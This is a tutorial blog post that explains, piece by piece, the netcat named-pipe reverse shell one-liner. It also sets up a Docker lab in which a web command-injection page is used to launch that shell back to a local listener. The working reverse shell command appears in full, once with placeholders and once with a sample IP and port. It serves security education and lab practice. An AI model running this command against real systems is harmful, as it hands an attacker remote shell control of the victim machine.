---
layout: post
title:  "Anatomy of a Reverse Shell: nc named pipe"
categories: 
excerpt: "Breaking down the cryptic reverse shell using nc and named pipes. How the reverse shell works, and a hands-on docker lab to test out reverse shells."
---

In penetration testing and hacking one of the main goals is to obtain a reverse shell on the target/victim system. Sometimes the code and commands to obtain these reverse shells can be very complicated if you aren't familiar with every little peice of the command that is chained together. Today we'll be discussing a netcat named pipe reverse shell, and breaking it down to fully understand how this reverse shell works. 

<!-- TODO: Add info popup with docker container to test reverse shells on using netcat or telnet. -->

# Netcat named pipe
Here is the reverse shell command that we are taking a deeper look into:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc IP PORT > /tmp/f
```

If you have remote code execution on a target system, and that system has `nc` installed and available, you can enter the above code replacing `IP` and `PORT` with your own IP and a listening port, and you will get a shell on the target box that lets you enter commands and receive the output of those commands in your own terminal. 

Lets break down each one of these individual commands and take a closer look at what they do, and how they work together to give you a semi-interactive reverse shell.

**rm /tmp/f;**<br />
This one is simple, first off it just removes the `/tmp/f` file if it exists. This will allow this file to be created in the next step without interferring with an existing file. Ideally this filename would fairly unique, and if you're using one of these in a CTF or engagement, make sure to use a unique filename for all instances of the `/tmp/f` file in the command. 

**mkfifo /tmp/f;**<br />
This uses `mkfifo` to create a first in first out file. This is a special type of file also known as a named pipe. This file can be opened by one process for reading, and opened by another process for writing. 

Anything the writing process puts in the file is immediately read by the process that is reading the same file.

**cat /tmp/f**<br>
`cat` is typically used to read a file and output the contents to the terminal. In this instance, since we are reading in a FIFO/Named Pipe file `cat` will read the file, but since no program has begun writing to it there is no End Of File (EOF) marker. The program waits at this point for data to show up.

Once new data shows up, it will read the contents and send those contents down the pipeline to the next command, and if no EOF is seen pause and keep re-trying until new data is added to the file again. This process repeats until an EOF is read in. 

**| /bin/sh -i 2>&1**<br />
The contents of the `/tmp/f` file from the previous `cat` command are sent to the `/bin/sh` shell. We also supply the `-i` flag to `sh` which means this is an interactive session, and it will execute any commands as they are read in from `/tmp/f`. 

Finally the `2>&1` says to redirect the error output into the standard output. By default error text is sent to a seperate error output stream and this is not sent forward to the next command, by redirecting error into standard output error text is then also sent to standard output so it is sent to the next command in the pipe.
]
**Why do almost all reverse shells use `/bin/sh` instead of the friendlier `/bin/bash`?**<br>
Not all systems will have `/bin/bash` installed. However, the `/bin/sh` shell will *always* be avialable on all Unix/Linux operating systems, even embedded and IoT systems!

**| nc IP PORT > /tmp/f**<br />
Next we take the output of our `sh` command (which is executing commands it sees in the `/tmp/f` file) and use `netcat` to connect to our specified IP and PORT. In addition, any input we receive from the IP (ie: commands being typed in) will be written to the `/tmp/f` file where they will be read by `cat` and piped into `sh` to repeat this process.

# Putting it all together
This type of reverse shell is cyclical in nature. Initially you read in the empty `/tmp/f` file, and `/bin/sh` executes nothing, because the file is empty. The output of executing the nothingness is then sent to `nc` at your IP, which allows you to type in a command that is then written to the `/tmp/f` file, immediately sent to the `/bin/sh` by the `cat /tmp/f` command, and the output of the command sent back to your `nc` session for you to see the output on your screen. 

# Hands on Docker lab
If you have `docker` you can use this hands on lab to practice the reverse shell commands demonstrated in this post. You can also use the lab to try out other reverse shell techniques. For a great reverse shell reference and command builder check out [RevShells.com](https://www.revshells.com/).

## Pre-requisites
To follow along with this lab you will need to have a few items installed on your PC. You will need Docker and Netcat. 

### Installing Docker
Docker is available for Windows, Linux, and MacOS. Please reference the [official Docker documentation](https://docs.docker.com/desktop/) for information on installing Docker for your OS. 

### Installing Netcat

#### Windows
You can download `nc.exe` from [int0x33's GitHub](https://github.com/int0x33/nc.exe/). Just save this somewhere and execute it directly from the command prompt. 

#### Linux
Netcat should be available in whatever package manager your linux distribution is using.

#### MacOS
Netcat should be available by default. Try running `nc` from a Terminal. 

### Finding your IP
To get the reverse shell to connect to you, you first need to know what your own IP is. Follow these simple steps to get your local IP address.

#### For Windows
Run the following in a command prompt and make note of your IPv4 Address. This will either be from the Ethernet adapter if you're plugged into the network, or Wireless Adapter if you're using WiFi. 
```
ipconfig
```

#### For Linux and MacOS
For most Linux distributions and MacOS you can use the following to grab your IP address:
```
ifconfig
```
## Starting the Docker rce-lab
Open a Command Prompt or Terminal window and run the following to launch the Docker image and serve it on port 80:
```
docker run -itp 80:80 --rm rufflabs/rce-lab
```

## Testing Remote Code Execution
Open your browser and go to `http://localhost/` and you should see a simple webpage offering an input box for a command to run. 

Start off with a simple command like `whoami` or `ls -al` to confirm that we have code execution on this website. You can confirm that `nc` is avialable by entering the command `which nc` which will return the path to the `nc` executable. Since we receive a path to `nc`, we know it's avialable. Otherwise it wouldn't be found. 

## Gaining Reverse Shell
With code execution inside the server (a docker container in this instance) we can almost asuredly obtain a reverse shell via netcat. 

### Starting a netcat listener
To receive the reverse shell we need to start a Netcat listener. This will tell Netcat to run on your local PC and listen on a specific port for a connection. Any data received over that connection will be displayed in your terminal, and any data you type into that window will be transmitted to the other side of the connection. 

If you're on Windows, open a Command Prompt window and use `cd <path>` to navigate to the location that your `nc.exe` was downloaded to. For example: `cd %USERPROFILE%\Downloads\` 

If you're on MacOS or Linux, open a Terminal and you should have `nc` available as a command. 

For Linux and Windows, run the following to start a listener on your local PC on port 4444, feel free to change the port if you want to. 
```
nc -lp 4444
```

If you're on MacOS, use the following instead, which is the same except for you can't specify the `-p` option, unless you have installed netcat via `brew` or some other means. The `nc` that comes with MacOS needs to be ran like this:
```
nc -l 4444
```

You should have a netcat listener running now, the window will be blank, and if you type anything into it nothing will happen yet because we don't have a connection from the other side. Next let's use our Remote Code Execution (RCE) on the docker container to turn this into a reverse shell. 

### Using RCE for Reverse Shell
We can take our netcat named pipe reverse shell from the start of this post and add in our IP address and port numbers. Here is the command I'm going to use:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.1.101 4444 > /tmp/f
```

Paste that command (updating the IP address as needed) into the input box on the site, and submit it. The webpage and browser should hang at this point, which is expected and normal. If we go to our terminal with the netcat listener we should see a shell prompt, and we can enter commands just like we did on the site, but this time instead of a web shell it's a reverse netcat shell!

**Why does the browser hang?**<br>
When the backend php code runs the reverse shell commands, the process never completes as the reverse shell process keeps repeating. Since this process never completes, the php process continues running and doesn't return any data to the browser. Eventually the php process will timeout and your reverse shell may be disconnected.